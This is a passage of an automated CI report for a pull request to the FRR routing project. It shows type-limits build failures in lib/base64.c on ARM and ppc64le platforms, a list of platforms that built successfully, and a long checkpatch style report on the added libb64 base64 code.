lib/base64.c:197:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n\nUbuntu 16.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U16ARM8BUILD/config.log/config.log.gz\nUbuntu 16.04 arm8 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U16ARM8BUILD/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 18.04 arm8 build: Failed (click for details)</summary>\nUbuntu 18.04 arm8 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U18ARM8BUILD/config.status/config.status\nUbuntu 18.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U18ARM8BUILD/config.log/config.log.gz\n\n__Make failed for Ubuntu 18.04 arm8 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U18ARM8BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3564/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:159:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:171:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:184:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:197:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n\n</details>\n<details>\n<summary>Ubuntu 18.04 ppc64le build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 ppc64le build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U1804PPC64LEBUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3564/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:159:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:171:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:184:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:197:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n\nUbuntu 18.04 ppc64le build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U1804PPC64LEBUILD/config.status/config.status\nUbuntu 18.04 ppc64le build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U1804PPC64LEBUILD/config.log/config.log.gz\n</details>\n<details>\n<summary>Ubuntu 18.04 arm7 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 arm7 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U18ARM7BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3564/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:159:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:171:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:184:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:197:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n\nUbuntu 18.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U18ARM7BUILD/config.log/config.log.gz\nUbuntu 18.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U18ARM7BUILD/config.status/config.status\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- FreeBSD 11 amd64 build\n- Ubuntu 16.04 i386 build\n- Ubuntu 18.04 amd64 build\n- Debian 11 amd64 build\n- FreeBSD 12 amd64 build\n- Ubuntu 16.04 amd64 build\n- CentOS 7 amd64 build\n- Redhat 8 amd64 build\n- Ubuntu 18.04 i386 build\n- NetBSD 9 amd64 build\n- OpenBSD 7 amd64 build\n- Debian 9 amd64 build\n- Ubuntu 20.04 amd64 build\n- Debian 10 amd64 build\n- Fedora 29 amd64 build\n</details>\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n<details>\n<summary>Ubuntu 16.04 arm7 build: Failed (click for details)</summary>\nUbuntu 16.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/CI101BUILD/config.status/config.status\nUbuntu 16.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/CI101BUILD/config.log/config.log.gz\n\n__Make failed for Ubuntu 16.04 arm7 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/CI101BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3564/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:159:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:171:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:184:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:197:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n\n</details>\n<details>\n<summary>Ubuntu 16.04 arm8 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 16.04 arm8 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U16ARM8BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3564/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:159:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:171:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:184:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:197:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n\nUbuntu 16.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U16ARM8BUILD/config.log/config.log.gz\nUbuntu 16.04 arm8 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U16ARM8BUILD/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 18.04 arm8 build: Failed (click for details)</summary>\nUbuntu 18.04 arm8 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U18ARM8BUILD/config.status/config.status\nUbuntu 18.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U18ARM8BUILD/config.log/config.log.gz\n\n__Make failed for Ubuntu 18.04 arm8 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U18ARM8BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3564/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:159:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:171:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:184:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:197:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n\n</details>\n<details>\n<summary>Ubuntu 18.04 ppc64le build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 ppc64le build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U1804PPC64LEBUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3564/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:159:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:171:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:184:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:197:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n\nUbuntu 18.04 ppc64le build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U1804PPC64LEBUILD/config.status/config.status\nUbuntu 18.04 ppc64le build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U1804PPC64LEBUILD/config.log/config.log.gz\n</details>\n<details>\n<summary>Ubuntu 18.04 arm7 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 arm7 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U18ARM7BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3564/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:159:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:171:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:184:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:197:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n\nUbuntu 18.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U18ARM7BUILD/config.log/config.log.gz\nUbuntu 18.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U18ARM7BUILD/config.status/config.status\n</details>\n\n    <stdin>:286: new blank line at EOF.\n    +\n    warning: 1 line adds whitespace errors.\n    Report for base64.c | 93 issues\n    ===============================================\n    WARNING: Block comments use * on subsequent lines\n    #2: FILE: /tmp/f1-15866/base64.c:2:\n    +/*\n    +This is part of the libb64 project, and has been placed in the public domain.\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #10: FILE: /tmp/f1-15866/base64.c:10:\n    +void base64_init_encodestate(base64_encodestate* state_in)\n    \n    WARNING: line over 80 characters\n    #19: FILE: /tmp/f1-15866/base64.c:19:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #19: FILE: /tmp/f1-15866/base64.c:19:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    \n    WARNING: Missing a blank line after declarations\n    #20: FILE: /tmp/f1-15866/base64.c:20:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    +\tif (value_in > 63) return '=';\n    \n    ERROR: trailing statements should be on next line\n    #20: FILE: /tmp/f1-15866/base64.c:20:\n    +\tif (value_in > 63) return '=';\n    \n    WARNING: line over 80 characters\n    #24: FILE: /tmp/f1-15866/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-15866/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-15866/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-15866/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #26: FILE: /tmp/f1-15866/base64.c:26:\n    +\tconst char* plainchar = plaintext_in;\n    \n    ERROR: \"foo* const bar\" should be \"foo * const bar\"\n    #27: FILE: /tmp/f1-15866/base64.c:27:\n    +\tconst char* const plaintextend = plaintext_in + length_in;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-15866/base64.c:28:\n    +\tchar* codechar = code_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #34: FILE: /tmp/f1-15866/base64.c:34:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #36: FILE: /tmp/f1-15866/base64.c:36:\n    +\t\twhile (1)\n    +\t\t{\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #36: FILE: /tmp/f1-15866/base64.c:36:\n    +\t\twhile (1)\n    +\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #39: FILE: /tmp/f1-15866/base64.c:39:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #51: FILE: /tmp/f1-15866/base64.c:51:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #63: FILE: /tmp/f1-15866/base64.c:63:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #76: FILE: /tmp/f1-15866/base64.c:76:\n    +\t\t\tif (state_in->stepcount == CHARS_PER_LINE/4)\n    +\t\t\t{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #87: FILE: /tmp/f1-15866/base64.c:87:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #87: FILE: /tmp/f1-15866/base64.c:87:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #89: FILE: /tmp/f1-15866/base64.c:89:\n    +\tchar* codechar = code_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #91: FILE: /tmp/f1-15866/base64.c:91:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-15866/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-15866/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-15866/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-15866/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-15866/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-15866/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-15866/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-15866/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-15866/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-15866/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-15866/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-15866/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-15866/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-15866/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-15866/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-15866/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #115: FILE: /tmp/f1-15866/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                    ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #115: FILE: /tmp/f1-15866/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                     ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-15866/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-15866/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-15866/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-15866/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-15866/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-15866/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-15866/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t           ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-15866/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-15866/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t              ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-15866/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t               ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-15866/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-15866/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t                   ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-15866/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-15866/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-15866/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-15866/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t          ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-15866/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-15866/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-15866/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-15866/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-15866/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-15866/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-15866/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-15866/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-15866/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-15866/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-15866/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-15866/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-15866/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-15866/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-15866/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-15866/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-15866/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-15866/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-15866/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-15866/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-15866/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-15866/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-15866/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t           ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-15866/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-15866/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t              ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-15866/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t               ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-15866/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-15866/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-15866/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-15866/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-15866/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-15866/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-15866/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-15866/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-15866/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-15866/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-15866/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-15866/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-15866/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-15866/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-15866/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-15866/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-15866/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-15866/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: 